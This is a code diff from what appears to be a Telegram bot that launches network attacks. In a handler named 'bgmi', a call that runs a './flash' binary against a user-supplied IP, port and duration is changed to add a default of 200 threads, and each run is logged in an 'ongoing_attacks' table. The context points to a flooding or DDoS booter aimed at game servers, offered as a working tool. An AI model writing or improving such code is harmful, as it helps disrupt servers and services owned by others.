@@ -123,7 +123,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     try:
-        subprocess.Popen(["./flash", ip, str(port), str(time_sec)])
+        subprocess.Popen(["./flash", ip, str(port), str(time_sec), "200"])  # Default 200 threads
         ongoing_attacks[(user_id, ip, port)] = {
             "username": username,
             "time": time_sec,
